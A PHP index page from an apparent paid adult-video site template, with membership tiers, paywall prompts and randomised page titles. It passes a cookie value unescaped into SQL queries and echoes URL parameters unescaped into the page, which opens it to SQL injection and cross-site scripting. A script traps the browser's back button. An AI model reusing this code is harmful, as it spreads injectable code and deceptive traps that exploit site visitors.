<?php
error_reporting(0); 
include("config/common.php");
include("config/conn.php");
$userid=$_COOKIE[userid];
$type="where userid='$userid'";
$user=queryall(uboip,$type);
$pid=$_GET[pid];
$uid=$_GET[uid];
if($pid){$url="?pid=".$pid."&uid=".$uid;$link="&pid=".$pid."&uid=".$uid;}else{$url="";$link="";}
$type="where id='1'";
$zhifu=queryall(ubozf,$type);

//读取标题列表
$type="order by rand() limit 1";
$name=queryall(biaoti,$type);
//随机标题
if($zhifu[wzname]=="0"){$tzname=$name[name];}else{$tzname="一淘模板";}
//关闭网站
if($zhifu[wz]=="1"){echo "404";exit;}
?>
<html>
<head>
<title><?php echo $tzname?></title>
<meta charset="gb2312">
<meta name="description" content="">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no, minimal-ui">
<meta http-equiv="Pragma" content="no-cache"> <meta http-equiv="Cache-Control" content="no-cache"> 
<meta http-equiv="Expires" content="0"> 
<link href="css/aio.css" rel="stylesheet">
<script src="js/jquery.min.js"></script>
<script type="text/javascript">
history.pushState({ page: 1 }, "title 1", "#nbb");
window.onhashchange = function (event) {window.location.hash = "nbb";};   
</script>

</head>
<body>
<div class="footer-box">
<div class="item item3 active"><div class="bname">岛国大片</div></div>
<a onclick="ubourl('zhainan.php<?php echo $url?>')" ><div class="item item2"><div class="bname">网友自拍</div></div></a>
<a onclick="ubourl('zuanshi.php<?php echo $url?>')" ><div class="item item1"><div class="bname">钻石专区</div></div></a>
<a onclick="ubourl('tongceng.php<?php echo $url?>')" ><div class="item item4"><div class="bname">同城约会</div></div></a>
<a onclick="ubourl('user.php<?php echo $url?>')" ><div class="item item5"><div class="bname">会员中心</div></div></a>
</div>
<div class="head-page">
<div class="title"><?php if($user[ms]=="普通会员" or $user[ms]==null){?>体验区<?php }elseif($user[ms]=="黄金会员"){?>黄金专区<?php }elseif($user[ms]=="钻石会员"){?>钻石专区<?php }elseif($user[ms]=="VIP会员"){?>VIP专区<?php }?></div><a onclick="ubourl('tousu.php<?php echo $url?>')"><button class="join-vip btn btn-red">举报</button></a><div class="clear-block"></div>
</div>
<div>
<div class="tbanner">
<div class="swiper-container swiper-container-horizontal">
<div class="swiper-wrapper" style="transform: translate3d(-1125px, 0px, 0px); transition-duration: 300ms;">
<!--优播幻灯调用-->
<?php
$query = mysql_query("SELECT * FROM ubohd where lx='index' order by rand()  limit 4");
while($a = mysql_fetch_array($query)) {
?>  
<div class="swiper-slide" title="<?php echo $a[name]?>" data-swiper-slide-index="3" style="width: 375px;">
<a onClick="uboplay('<?php echo $a[id]?>','ubohd')" ><img src="<?php echo $a[pic]?>"></a>
</div>
<?php }?>
</div>
<div class="swiper-pagination swiper-pagination-bullets">
<span class="swiper-pagination-bullet"></span>
<span class="swiper-pagination-bullet"></span>
<span class="swiper-pagination-bullet swiper-pagination-bullet-active"></span>
<span class="swiper-pagination-bullet"></span>
</div>
<div class="swiper-scrollbar">
</div>
<div class="tip"></div>
</div>
</div>
<a href="javascript:pay()"><div class="banner2-box"><img style="width:100%" src="css/750x131_p.png"></div></a>
</div>
<div>
<div class="list-box">
<?php if($user[ms]=="普通会员" or $user[ms]==null){?>
<?php
$query = mysql_query("SELECT * FROM ubosk  order by rand()  limit 6");
while($a = mysql_fetch_array($query)) {
?>  
<div class="item"><a onclick="uboplay('<?php echo $a[id]?>','ubosk')">
<div class="img"><div class="flag flag001"><?php echo $a[ms]?></div>
<div class="rep" style="background-image:url(<?php echo $a[pic]?>)">
</div>
</div>
<div class="title"><?php echo $a[name]?></div>
<div class="date">
<?php echo date("Y-m-d");?>
</div>
</a>
</div>
<?php }?>
<?php }?>
<?php
if($user[ms]=="VIP会员" or $user[ms]=="黄金会员" or $user[ms]=="普通会员" or $user[ms]==null){
$query = mysql_query("SELECT * FROM ubovip  order by rand()  limit 24");
}elseif($user[ms]=="钻石会员"){
$query = mysql_query("SELECT * FROM ubozuan  order by rand()  limit 24");
}
while($a = mysql_fetch_array($query)) {
?>  
<?php if($user[ms]=="普通会员" or $user[ms]==null){?>
<div class="item"><a onclick="pay()">
<div class="img"><div class="flag flag001"><?php echo $a[ms]?></div>
<div class="rep" style="background-image:url(<?php echo $a[pic]?>)">
</div>
</div>
<div class="title"><?php echo $a[name]?></div>
<div class="date">
<?php echo date("Y-m-d");?>
</div>
</a>
</div>
<?php  }elseif($user[ms]=="VIP会员"){?>
<div class="item"><a <?php if($a[ms]=="限制级"){?>onclick="pay()"<?php }else{?>  onclick="uboplay('<?php echo $a[id]?>','ubovip')"<?php }?> >
<div class="img"><div class="flag flag001"><?php echo $a[ms]?></div>
<div class="rep" style="background-image:url(<?php echo $a[pic]?>)">
</div>
</div>
<div class="title"><?php echo $a[name]?></div>
<div class="date">
<?php echo date("Y-m-d");?>
</div>
</a>
</div>
<?php }elseif($user[ms]=="黄金会员"){?>
<div class="item"><a  onclick="uboplay('<?php echo $a[id]?>','ubovip')" >
<div class="img"><div class="flag flag001"><?php echo $a[ms]?></div>
<div class="rep" style="background-image:url(<?php echo $a[pic]?>)">
</div>
</div>
<div class="title"><?php echo $a[name]?></div>
<div class="date">
<?php echo date("Y-m-d");?>
</div>
</a>
</div>
<?php }elseif($user[ms]=="钻石会员"){?>
<div class="item"><a  onclick="uboplay('<?php echo $a[id]?>','ubozuan')" >
<div class="img"><div class="flag flag001"><?php echo $a[ms]?></div>
<div class="rep" style="background-image:url(<?php echo $a[pic]?>)">
</div>
</div>
<div class="title"><?php echo $a[name]?></div>
<div class="date">
<?php echo date("Y-m-d");?>
</div>
</a>
</div>
<?php }?>
<?php }?>
<span class="clear-block"></span>
</div>
</div>
<?php if($user[ms]=="普通会员" or $user[ms]==null){?>
<a href="javascript:pay()"><div class="bottom-tip"><img src="css/750x131_p2.png"></div></a>
<?php }elseif($user[ms]=="VIP会员"){?>
<a href="javascript:pay()"><div class="bottom-tip"><img src="css/750x131_p2.png"></div></a>
<?php }elseif($user[ms]=="黄金会员"){?>
<a href="javascript:pay()"><div class="bottom-tip"><img src="css/750x131_p2.png"></div></a>
<?php }elseif($user[ms]=="钻石会员"){?>
<a href="javascript:pay()"><div class="bottom-tip"><img src="css/750x131_p2.png"></div></a>
<?php }?>
<?php include_once('foot.php'); ?> 

</body>
</html>
